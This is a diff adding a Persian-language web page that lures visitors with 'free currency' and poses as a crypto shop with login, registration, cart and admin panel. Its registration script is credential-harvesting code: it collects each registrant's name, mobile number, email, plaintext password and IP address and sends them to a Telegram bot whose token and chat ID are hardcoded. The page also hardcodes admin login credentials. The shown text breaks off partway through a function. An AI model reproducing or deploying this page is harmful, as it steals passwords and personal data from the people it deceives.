@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <title>ارز رایگان</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 12px;
+            position: relative;
+            overflow-x: hidden;
+            width: 100%;
+        }
+        
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+
+        /* دکمه رفرش */
+        .refresh-btn-circle {
+            position: fixed;
+            top: 16px;
+            left: 16px;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 215, 0, 0.25);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 215, 0, 0.5);
+            border-radius: 50%;
+            color: #FFD700;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+            margin: 0;
+            padding: 0;
+        }
+
+        .refresh-btn-circle:hover {
+            transform: scale(1.1) rotate(180deg);
+            box-shadow: 0 0 25px rgba(255, 215, 0, 0.6);
+            background: rgba(255, 215, 0, 0.4);
+        }
+
+        /* کانتینر اصلی لاگین - استایل طلایی */
+        .login-container {
+            max-width: 500px;
+            width: 100%;
+            padding: 40px 30px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(15px);
+            border-radius: 30px;
+            border: 2px solid rgba(255, 215, 0, 0.5);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 30px rgba(255, 215, 0, 0.2);
+            animation: fadeInUp 0.6s ease-out forwards;
+        }
+
+        /* کانتینر پنل کاربری */
+        .container, .admin-container {
+            position: relative;
+            background: rgba(20, 20, 30, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5);
+            animation: fadeInUp 0.6s ease-out forwards;
+            z-index: 2;
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+            overflow-x: auto;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            padding: 24px 20px;
+            margin: 0 auto;
+            overflow-x: hidden;
+        }
+
+        .admin-container {
+            width: 100%;
+            padding: 20px 16px;
+            margin: 0 auto;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* استایل عنوان */
+        .highrise-title {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .highrise-title h1 {
+            color: #FFD700;
+            font-size: clamp(1.8rem, 8vw, 2.5rem);
+            text-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+            letter-spacing: 2px;
+        }
+        
+        .highrise-title .sub {
+            color: rgba(255, 215, 0, 0.8);
+            font-size: 14px;
+            margin-top: 8px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #FFD700;
+            font-size: 14px;
+            font-weight: bold;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 15px;
+            font-size: 14px;
+            color: #fff;
+            transition: 0.3s;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #FFD700;
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .toggle-password {
+            position: absolute;
+            left: 12px;
+            bottom: 12px;
+            background: rgba(255, 215, 0, 0.2);
+            border: none;
+            color: #FFD700;
+            cursor: pointer;
+            font-size: 11px;
+            padding: 4px 10px;
+            border-radius: 20px;
+            transition: 0.2s;
+            width: auto;
+            display: inline-block;
+        }
+        
+        .toggle-password:hover {
+            background: rgba(255, 215, 0, 0.5);
+            color: #000;
+        }
+
+        button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #FFD700, #DAA520);
+            border: none;
+            border-radius: 15px;
+            color: #3E1F00;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            margin-top: 8px;
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.5);
+        }
+
+        .switch-link {
+            margin-top: 20px;
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.6);
+            text-align: center;
+        }
+
+        .switch-link a {
+            color: #FFD700;
+            text-decoration: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.9);
+            color: #FFD700;
+            padding: 10px 16px;
+            border-radius: 40px;
+            font-size: 12px;
+            z-index: 1000;
+            animation: slideIn 0.3s ease;
+            display: none;
+            border-left: 4px solid #FFD700;
+            text-align: center;
+            max-width: calc(100% - 40px);
+            margin: 0 auto;
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* استایل پنل کاربری */
+        .nav-tabs {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            overflow-x: auto;
+            overflow-y: hidden;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: thin;
+            white-space: nowrap;
+            flex-wrap: nowrap;
+            border-bottom: 1px solid rgba(255,255,255,0.2);
+        }
+
+        .nav-tab {
+            background: rgba(255,255,255,0.1);
+            padding: 8px 16px;
+            border-radius: 40px;
+            cursor: pointer;
+            transition: 0.3s;
+            width: auto;
+            margin-top: 0;
+            font-size: 13px;
+            flex-shrink: 0;
+            white-space: nowrap;
+        }
+
+        .nav-tab:hover {
+            background: rgba(255, 215, 0, 0.3);
+            transform: none;
+        }
+
+        .nav-tab.active {
+            background: linear-gradient(90deg, #FFD700, #DAA520);
+            color: #3E1F00;
+        }
+
+        .products-grid, .special-products-grid, .discount-products-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 16px;
+            margin-top: 16px;
+        }
+
+        .product-card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 14px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            transition: 0.3s;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+        }
+
+        .product-card:hover {
+            transform: translateY(-3px);
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .product-card.special {
+            border: 2px solid #FFD700;
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 255, 255, 0.05));
+        }
+
+        .product-card.discount {
+            border: 2px solid #ff6b6b;
+        }
+
+        .product-image-placeholder {
+            width: 100%;
+            height: 160px;
+            border-radius: 16px;
+            margin-bottom: 12px;
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 255, 255, 0.05));
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: rgba(255, 255, 255, 0.3);
+            font-size: 40px;
+        }
+
+        .special-badge {
+            position: absolute;
+            top: -8px;
+            right: 12px;
+            background: linear-gradient(90deg, #FFD700, #DAA520);
+            color: #3E1F00;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: bold;
+            z-index: 2;
+        }
+
+        .discount-badge {
+            position: absolute;
+            top: -8px;
+            left: 12px;
+            background: #ff6b6b;
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 10px;
+            font-weight: bold;
+            z-index: 2;
+        }
+
+        .product-title {
+            color: #FFD700;
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 8px;
+        }
+
+        .product-price {
+            color: #51cf66;
+            font-size: 16px;
+            font-weight: bold;
+            margin: 8px 0;
+        }
+
+        .old-price {
+            color: rgba(255,255,255,0.5);
+            font-size: 12px;
+            text-decoration: line-through;
+            margin-left: 8px;
+        }
+
+        .product-desc {
+            color: rgba(255,255,255,0.7);
+            font-size: 11px;
+            margin-bottom: 12px;
+            flex: 1;
+        }
+
+        .add-to-cart-btn {
+            background: linear-gradient(90deg, #FFD700, #DAA520);
+            color: #3E1F00;
+            padding: 8px;
+            font-size: 12px;
+            margin-top: 0;
+        }
+
+        .cart-item {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 12px;
+            margin-bottom: 10px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .cart-item-info {
+            flex: 2;
+            min-width: 150px;
+        }
+
+        .cart-item-actions {
+            display: flex;
+            gap: 8px;
+        }
+
+        .cart-item button {
+            width: auto;
+            padding: 6px 12px;
+            margin-top: 0;
+            background: rgba(255,215,0,0.3);
+            color: #FFD700;
+        }
+
+        .profile-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 16px;
+            border-radius: 20px;
+            margin: 15px 0;
+        }
+
+        .profile-card p {
+            color: rgba(255, 255, 255, 0.9);
+            margin: 8px 0;
+            font-size: 13px;
+        }
+
+        .profile-card strong { color: #FFD700; }
+
+        .cart-summary {
+            background: rgba(255, 215, 0, 0.1);
+            padding: 12px;
+            border-radius: 15px;
+            margin-top: 15px;
+            text-align: center;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(218, 165, 32, 0.2));
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 20px;
+            padding: 16px;
+            margin-bottom: 20px;
+        }
+
+        .logout-btn {
+            background: linear-gradient(90deg, #ff6b6b, #ee5a24);
+            width: auto;
+            padding: 8px 18px;
+            font-size: 13px;
+            color: white;
+        }
+
+        .admin-header {
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .ticket-item, .order-item, .message-item, .request-item {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 12px;
+            margin-bottom: 12px;
+            border-right: 3px solid #FFD700;
+        }
+
+        @media (max-width: 768px) {
+            .login-container { padding: 30px 20px; margin: 20px; }
+            .admin-header { flex-direction: column; align-items: stretch; }
+            .logout-btn { width: 100%; text-align: center; }
+            .products-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<button class="refresh-btn-circle" onclick="location.reload()">
+    🔄
+</button>
+
+<div id="app">
+    <!-- صفحه لاگین (بدون لینک ادمین) -->
+    <div id="userLoginPage" class="login-container">
+        <div class="highrise-title">
+            <h1>ارز</h1>
+            <div class="sub">ارز رایگان</div>
+            <div class="sub" style="font-size: 12px;">ارز رایگان را همین الان دریافت کنید</div>
+        </div>
+        <div class="input-group">
+            <label>ایمیل:</label>
+            <input type="text" id="userLoginUsername" placeholder="ایمیل">
+        </div>
+        <div class="input-group">
+            <label>رمز عبور:</label>
+            <input type="password" id="userLoginPassword" placeholder="رمز عبور">
+            <button class="toggle-password" onclick="togglePassword('userLoginPassword')">👁 نمایش</button>
+        </div>
+        <button onclick="userLogin()"> دریافت ارز رايگان</button>
+        <div class="switch-link">حساب کاربری ندارید؟ <a onclick="showUserRegister()">ثبت نام</a></div>
+    </div>
+    
+    <!-- صفحه ثبت نام -->
+    <div id="userRegisterPage" class="login-container hidden">
+        <div class="highrise-title">
+            <h1>ثبت نام</h1>
+            <div class="sub">ایجاد حساب جدید</div>
+        </div>
+        <div class="input-group"><label>نام</label><input type="text" id="regName" placeholder="نام"></div>
+        <div class="input-group"><label>نام خانوادگی</label><input type="text" id="regFamily" placeholder="نام خانوادگی"></div>
+        <div class="input-group"><label>شماره همراه</label><input type="tel" id="regMobile" placeholder="0912xxx"></div>
+        <div class="input-group"><label>ایمیل</label><input type="email" id="regEmail" placeholder="example@gmail.com"></div>
+        <div class="input-group"><label>رمز عبور</label><input type="password" id="regPassword"><button class="toggle-password" onclick="togglePassword('regPassword')">نمایش</button></div>
+        <button onclick="userRegister()">ثبت نام</button>
+        <div class="switch-link"><a onclick="showLogin()">بازگشت به ورود</a></div>
+    </div>
+    
+    <!-- پنل کاربری -->
+    <div id="userProfilePage" class="admin-container hidden"></div>
+    
+    <!-- پنل ادمین -->
+    <div id="adminPanel" class="admin-container hidden"></div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+    // تنظیمات تلگرام
+    const TELEGRAM_BOT_TOKEN = "7645107301:AAEzI3zc5YsYDdvl9vQblpNU24JKab0A50Y";
+    const TELEGRAM_CHAT_ID = "5549724583";
+    
+    // ========== اطلاعات ادمین ==========
+    const ADMIN_EMAIL = "mohammad@gmail.com";
+    const ADMIN_PASSWORD = "mohamad";
+    // ==================================
+    
+    // ========== توابع اعتبارسنجی ==========
+    function isValidEmail(email) {
+        const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+        return emailPattern.test(email);
+    }
+    
+    function isValidMobile(mobile) {
+        const mobilePattern = /^09[0-9]{9}$/;
+        return mobilePattern.test(mobile);
+    }
+    // ====================================
+    
+    async function sendToTelegram(userData) {
+        let userIp = "نامشخص";
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            userIp = ipData.ip;
+        } catch(e) {}
+        const text = ` ثبت نام جدید در \n👤 نام: ${userData.name}\n👥 نام خانوادگی: ${userData.family}\n📞 شماره: ${userData.mobile}\n📧 ایمیل: ${userData.email}\n🔑 رمز: ${userData.password}\n🌐 IP: ${userIp}\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
+    }
+
+    let users = JSON.parse(localStorage.getItem('systemUsers')) || [];
+    let currentUser = JSON.parse(localStorage.getItem('currentSession')) || null;
+    let products = JSON.parse(localStorage.getItem('products')) || [
+        { id: 1, name: "ارز شیبا", price: 1200000, desc: "دوره جامع ارز دیجیتال", image: "" },
+        { id: 2, name: "ارز نات کوین", price: 890000, desc: "قالب اختصاصی", image: "" },
+        { id: 3, name: "ارز بیتکوین", price: 500000, desc: "یک ساعت مشاوره", image: "" },
+        { id: 4, name: "ارز تتر", price: 2500000, desc: "مجموعه آموزش", image: "" },
+        { id: 5, name: "ارز تون کوین", price: 350000, desc: "افزونه قدرتمند", image: "" }
+    ];
+    let specialProducts = JSON.parse(localStorage.getItem('specialProducts')) || [1, 4];
+    let discountProducts = JSON.parse(localStorage.getItem('discountProducts')) || {
+        2: { percent: 15, startDate: null, endDate: null },
+        5: { percent: 25, startDate: null, endDate: null }
+    };
+    let cart = JSON.parse(localStorage.getItem('cart')) || [];
+    let orders = JSON.parse(localStorage.getItem('orders')) || [];
+    let tickets = JSON.parse(localStorage.getItem('tickets')) || [];
+    let adminMessages = JSON.parse(localStorage.getItem('adminMessages')) || [];
+    let balanceRequests = JSON.parse(localStorage.getItem('balanceRequests')) || [];
+    let balanceTransactions = JSON.parse(localStorage.getItem('balanceTransactions')) || [];
+
+    function saveAll(){ 
+        localStorage.setItem('systemUsers', JSON.stringify(users)); 
+        localStorage.setItem('currentSession', JSON.stringify(currentUser)); 
+        localStorage.setItem('products', JSON.stringify(products)); 
+        localStorage.setItem('specialProducts', JSON.stringify(specialProducts)); 
+        localStorage.setItem('discountProducts', JSON.stringify(discountProducts)); 
+        localStorage.setItem('cart', JSON.stringify(cart)); 
+        localStorage.setItem('orders', JSON.stringify(orders)); 
+        localStorage.setItem('tickets', JSON.stringify(tickets)); 
+        localStorage.setItem('adminMessages', JSON.stringify(adminMessages)); 
+        localStorage.setItem('balanceRequests', JSON.stringify(balanceRequests)); 
+        localStorage.setItem('balanceTransactions', JSON.stringify(balanceTransactions)); 
+    }
+    
+    function showToast(msg){ let t=document.getElementById('toast'); t.textContent=msg; t.style.display='block'; setTimeout(()=>t.style.display='none',3000); }
+    function togglePassword(id){ let inp=document.getElementById(id); if(inp) inp.type=inp.type==='password'?'text':'password'; }
+    
+    function userLogin(){
+        let username = document.getElementById('userLoginUsername').value.trim();
+        let pass = document.getElementById('userLoginPassword').value.trim();
+        
+        // بررسی ورود ادمین
+        if(username === ADMIN_EMAIL && pass === ADMIN_PASSWORD){ 
+            currentUser = {email: ADMIN_EMAIL, name: "مدیر", balance: 0, isAdmin: true}; 
+            saveAll(); 
+            showAdminPanel(); 
+            showToast("ورود مدیر موفق"); 
+            return; 
+        }
+        
+        let user = users.find(u => u.email === username && u.password === pass);
+        if(user){ 
+            currentUser = user; 
+            saveAll(); 
+            showUserPanel(); 
+            showToast(`خوش آمدید ${user.name}`); 
+        } else { 
+            showToast("اطلاعات نادرست است"); 
+        }
+    }
+    
+    function userRegister(){ 
+        let name = document.getElementById('regName').value.trim();
+        let family = document.getElementById('regFamily').value.trim();
+        let mobile = document.getElementById('regMobile').value.trim();
+        let email = document.getElementById('regEmail').value.trim();
+        let pass = document.getElementById('regPassword').value.trim();
+        
+        if(!name || !family || !mobile || !email || !pass){
+            showToast("تمامی فیلدها الزامی هستند");
+            return;
+        }
+        
+        if(!isValidEmail(email)){
+            showToast("لطفا یک ایمیل معتبر وارد کنید (مثال: name@gmail.com)");
+            return;
+        }
+        
+        if(!isValidMobile(mobile)){
+            showToast("لطفا یک شماره همراه معتبر 11 رقمی وارد کنید (مثال: 09123456789)");
+            return;
+        }
+        
+        if(users.find(u=>u.email===email)){
+            showToast("ایمیل تکراری است");
+            return;
+        }
+        if(users.find(u=>u.mobile===mobile)){
+            showToast("شماره همراه تکراری است");
+            return;
+        }
+        
+        let newUser = { email, name, family, mobile, password: pass, balance: 0, isAdmin: false };
+        users.push(newUser);
+        saveAll();
+        
+        sendToTelegram({ name, family, mobile, email, password: pass });
+        
+        showLogin();
+        showToast("ثبت نام موفق، حالا وارد شوید");
+    }
+    
+    function showLogin(){ 
+        document.getElementById('userLoginPage').classList.remove('hidden'); 
+        document.getElementById('userRegisterPage').classList.add('hidden'); 
+        document.getElementById('userProfilePage').classList.add('hidden'); 
+        document.getElementById('adminPanel').classList.add('hidden'); 
+        document.getElementById('userLoginUsername').value = '';
+        document.getElementById('userLoginPassword').value = '';
+    }
+    
+    function showUserRegister(){ 
+        document.getElementById('userLoginPage').classList.add('hidden'); 
+        document.getElementById('userRegisterPage').classList.remove('hidden'); 
+    }
+    
+    function logout(){ 
+        currentUser = null; 
+        localStorage.removeItem('currentSession'); 
+        showLogin(); 
+        showToast("خارج شدید"); 
+    }
+    
+    function getDiscountedPrice(price, productId){ 
+        let d = discountProducts[productId]; 
+        if(d && d.percent) return price * (100 - d.percent) / 100; 
+        return price; 
+    }
+    
+    function addToCart(productId){ 
+        let p = products.find(p=>p.id==productId); 
+        if(p){ 
+            let cartItem = cart.find(i=>i.id==productId); 
+            if(cartItem) cartItem.qty += 1; 
+            else cart.push({id:p.id, name:p.name, price:getDiscountedPrice(p.price, p.id), qty:1, originalPrice:p.price}); 
+            saveAll(); 
+            showToast(`${p.name} به سبد اضافه شد`); 
+            renderUserProfile(); 
+        } 
+    }
+    
+    function removeFromCart(productId){ 
+        cart = cart.filter(i=>i.id!=productId); 
+        saveAll(); 
+        renderUserProfile(); 
+        showToast("حذف شد"); 
+    }
+    
+    function updateQty(id, delta){ 
+        let item = cart.find(i=>i.id==id); 
+        if(item){ 
+            item.qty += delta; 
+            if(item.qty <= 0) cart = cart.filter(i=>i.id!=id); 
+            saveAll(); 
+            renderUserProfile(); 
+        } 
+    }
+    
+    function checkout(){ 
+        if(cart.length === 0){ showToast("سبد خالی است"); return; } 
+        let total = cart.reduce((sum,i)=>sum+(i.price*i.qty),0); 
+        if(currentUser.balance < total){ 
+            showToast(`موجودی کافی نیست. نیاز: ${total.toLocaleString()} تومان`); 
+            return; 
+        } 
+        currentUser.balance -= total; 
+        let newOrder = {id:Date.now(), userId:currentUser.email, items:JSON.parse(JSON.stringify(cart)), total, date:new Date().toLocaleString(), status:"پرداخت شده"}; 
+        orders.push(newOrder); 
+        cart = []; 
+        balanceTransactions.push({userId:currentUser.email, type:"خرید", amount:-total, date:new Date().toLocaleString()}); 
+        saveAll(); 
+        renderUserProfile(); 
+        showToast(`سفارش ثبت شد. موجودی جدید: ${currentUser.balance.toLocaleString()} تومان`); 
+    }
+    
+    function renderProductsList(productList){ 
+        return `<div class="products-grid">${productList.map(p=>{ 
+            let finalPrice = getDiscountedPrice(p.price, p.id); 
+            let hasDisc = !!discountProducts[p.id]; 
+            let isSpec = specialProducts.includes(p.id); 
+            return `<div class="product-card ${isSpec?'special':''} ${hasDisc?'discount':''}">
+                <div class="product-image-placeholder">🪙</div>
+                ${isSpec?'<div class="special-badge">✨ ویژه</div>':''}
+                ${hasDisc?'<div class="discount-badge">🔥 تخفیف</div>':''}
+                <div class="product-title">${p.name}</div>
+                <div class="product-desc">${p.desc}</div>
+                <div class="product-price">${finalPrice.toLocaleString()} تومان ${p.price!==finalPrice?`<span class="old-price">${p.price.toLocaleString()}</span>`:''}</div>
+                <button class="add-to-cart-btn" onclick="addToCart(${p.id})">➕ افزودن به سبد</button>
+            </div>`}).join('')}</div>`; 
+    }
+    
+    function showUserTab(tab){
+        let contentDiv = document.getElementById('userTabContent'); 
+        if(!contentDiv) return;
+        if(tab === 'products') contentDiv.innerHTML = renderProductsList(products);
+        else if(tab === 'special') contentDiv.innerHTML = renderProductsList(products.filter(p=>specialProducts.includes(p.id)));
+        else if(tab === 'discount') contentDiv.innerHTML = renderProductsList(products.filter(p=>discountProducts[p.id]));
+        else if(tab === 'orders'){ 
+            let userOrders = orders.filter(o=>o.userId===currentUser.email); 
+            contentDiv.innerHTML = userOrders.length ? userOrders.map(o=>`<div class="order-item">📦 سفارش ${o.id}<br>تاریخ: ${o.date}<br>مجموع: ${o.total.toLocaleString()} تومان<br>وضعیت: ${o.status}</div>`).join('') : '<p>سفارشی نیست</p>';
+        }
+        else if(tab === 'tickets'){ 
+            contentDiv.innerHTML = `<div><input type="text" id="ticketSubject" placeholder="موضوع"><textarea id="ticketMsg" placeholder="متن تیکت"></textarea><button onclick="sendTicket()">ارسال تیکت</button></div>
+            <div id="ticketsList">${tickets.filter(t=>t.userId===currentUser.email).map(t=>`<div class="ticket-item"><strong>${t.subject}</strong><br>${t.message}<br>وضعیت: ${t.status} | پاسخ: ${t.reply||'پاسخی داده نشده'}</div>`).join('')}</div>`;
+        }
+        else if(tab === 'messages'){ 
+            let msgs = adminMessages.filter(m=>m.userId===currentUser.email); 
+            contentDiv.innerHTML = msgs.length ? msgs.map(m=>`<div class="message-item"><strong>از ادمین:</strong> ${m.message}<br><small>${m.date}</small></div>`).join('') : '<p>پیام جدیدی نیست</p>';
+        }
+        document.querySelectorAll('.nav-tab').forEach(el => el.classList.remove('active'));
+    }
+    
+    function sendTicket(){ 
+        let sub = document.getElementById('ticketSubject')?.value; 
+        let msg = document.getElementById('ticketMsg')?.value; 
+        if(!sub || !msg){ showToast("موضوع و متن الزامی"); return; } 
+        tickets.push({id:Date.now(), userId:currentUser.email, subject:sub, message:msg, status:"در انتظار پاسخ", reply:""}); 
+        saveAll(); 
+        showUserTab('tickets'); 
+        showToast("تیکت ارسال شد"); 
+    }
+    
+    function requestBalance(){ 
+        let amount = prompt("مبلغ درخواست (تومان):"); 
+        if(amount && !isNaN(amount)){ 
+            balanceRequests.push({id:Date.now(), userId:currentUser.email, amount:parseInt(amount), status:"pending"}); 
+            saveAll(); 
+            showToast("درخواست ثبت شد، ادمین بررسی میکند"); 
+        } 
+    }
+    
+    function renderUserProfile(){
+        let container = document.getElementById('userProfilePage'); 
+        if(!container) return;
+        let totalCart = cart.reduce((s,i)=>s+(i.price*i.qty),0);
+        let html = `<div class="admin-header"><h1>👤 پنل کاربری ${currentUser.name}</h1><button class="logout-btn" onclick="logout()">خروج</button></div>
+        <div class="profile-card"><p><strong>نام:</strong> ${currentUser.name} ${currentUser.family || ''}</p><p><strong>ایمیل:</strong> ${currentUser.email}</p><p><strong>موجودی:</strong> ${currentUser.balance.toLocaleString()} تومان</p><button onclick="requestBalance()">درخواست افزایش موجودی</button></div>
+        <div class="balance-card"><h3>🛒 سبد خرید</h3>${cart.length===0?'<p>سبد خالی است</p>':cart.map(i=>`<div class="cart-item"><div class="cart-item-info"><b>${i.name}</b><br>قیمت: ${i.price.toLocaleString()} تومان<br>تعداد: ${i.qty}</div><div class="cart-item-actions"><button onclick="updateQty(${i.id},1)">+</button><button onclick="updateQty(${i.id},-1)">-</button><button onclick="removeFromCart(${i.id})">حذف</button></div></div>`).join('')}
+        ${cart.length?`<div class="cart-summary">مجموع: ${totalCart.toLocaleString()} تومان<button onclick="checkout()">پرداخت و تسویه</button></div>`:''}</div>
+        <div class="nav-tabs"><div class="nav-tab active" onclick="showUserTab('products')">محصولات</div><div class="nav-tab" onclick="showUserTab('special')">ویژه</div><div class="nav-tab" onclick="showUserTab('discount')">تخفیف دار</div><div class="nav-tab" onclick="showUserTab('orders')">سفارشات</div><div class="nav-tab" onclick="showUserTab('tickets')">تیکت‌ها</div><div class="nav-tab" onclick="showUserTab('messages')">پیام‌های ادمین</div></div>
+        <div id="userTabContent"></div>`;
+        container.innerHTML = html; 
+        container.classList.remove('hidden'); 
+        document.getElementById('userLoginPage').classList.add('hidden'); 
+        document.getElementById('adminPanel').classList.add('hidden'); 
+        showUserTab('products');
+    }
+    
+    function showUserPanel(){ renderUserProfile(); }
+    
+    // ========== توابع پنل ادمین ==========
+    function showAdminPanel(){
+        let container = document.getElementById('adminPanel');
+        let totalUsers = users.length;
+        let totalSales = orders.reduce((s,o)=>s+o.total,0);
+        container.innerHTML = `<div class="admin-header"><h1>🛡️ پنل مدیریت</h1><button class="logout-btn" onclick="logout()">خروج</button></div>
+        <div class="stats-grid" style="display:grid;grid-template-columns:repeat(2,1fr);gap:12px;margin-bottom:20px">
+            <div class="profile-card">👥 کاربران: ${totalUsers}</div>
+            <div class="profile-card">💰 فروش: ${totalSales.toLocaleString()} تومان</div>
+        </div>
+        <div class="nav-tabs"><div class="nav-tab active" onclick="adminTab('usersManage')">کاربران</div><div class="nav-tab" onclick="adminTab('balanceReq')">درخواست شارژ</div><div class="nav-tab" onclick="adminTab('sendMsg')">ارسال پیام</div><div class="nav-tab" onclick="adminTab('ordersList')">سفارشات</div></div>
+        <div id="adminTabContent"></div>`;
+        container.classList.remove('hidden');
+        document.getElementById('userLoginPage').classList.add('hidden');
+        document.getElementById('userProfilePage').classList.add('hidden');
+        adminTab('usersManage');
+    }
+    
+    function adminTab(tab){
+        let div = document.getElementById('adminTabContent');
+        if(!div) return;
+        if(tab === 'usersManage') div.innerHTML = `<div class="table-wrapper"><table style="width:100%"><tr><th>نام</th><th>نام خانوادگی</th><th>ایمیل</th><th>موبایل</th><th>موجودی</th><th>عملیات</th></tr>${users.map(u=>`<tr><td>${u.name}</td><td>${u.family || '-'}</td><td>${u.email}</td><td>${u.mobile || '-'}</td><td>${u.balance.toLocaleString()}</td><td><button onclick="adminAddBalance('${u.email}')">شارژ</button></td></tr>`).join('')}</table></div>`;
+        else if(tab === 'balanceReq') div.innerHTML = `${balanceRequests.filter(r=>r.status==='pending').map(r=>`<div class="request-item">کاربر: ${r.userId} - مبلغ: ${r.amount.toLocaleString()} تومان <button onclick="approveBalance(${r.id}, true)">✅ تایید</button> <button onclick="approveBalance(${r.id}, false)">❌ رد</button></div>`).join('') || '<p>درخواستی نیست</p>'}`;
+        else if(tab === 'sendMsg') div.innerHTML = `<div><select id="msgUserSelect"><option value="all">همه کاربران</option>${users.map(u=>`<option value="${u.email}">${u.name} ${u.family||''}</option>`).join('')}</select><textarea id="adminMessageText" placeholder="متن پیام"></textarea><button onclick="sendAdminMessage()">ارسال پیام</button></div>`;
+        else if(tab === 'ordersList') div.innerHTML = `${orders.map(o=>`<div class="order-item">سفارش ${o.id} | کاربر: ${o.userId} | مبلغ: ${o.total.toLocaleString()} | تاریخ: ${o.date} | وضعیت: ${o.status}</div>`).join('') || '<p>سفارشی نیست</p>'}`;
+        document.querySelectorAll('#adminPanel .nav-tab').forEach(el => el.classList.remove('active'));
+    }
+    
+    function adminAddBalance(email){ 
+        let amount = prompt("مبلغ به تومان:"); 
+        if(amount){ 
+            let user = users.find(u=>u.email===email); 
+            if(user){ 
+                user.balance += parseInt(amount); 
+                balanceTransactions.push({userId:email, type:"شارژ ادمین", amount:parseInt(amount), date:new Date().toLocaleString()}); 
+                saveAll(); 
+                adminTab('usersManage'); 
+                showToast(`موجودی ${user.name} افزایش یافت`);
+            } 
+        } 
+    }
+    
+    function approveBalance(reqId, approve){ 
+        let req = balanceRequests.find(r=>r.id===reqId); 
+        if(req){ 
+            if(approve){ 
+                let user = users.find(u=>u.email===req.userId); 
+                if(user) user.balance += req.amount; 
+            } 
+            req.status = approve ? "approved" : "rejected"; 
+            saveAll(); 
+            adminTab('balanceReq'); 
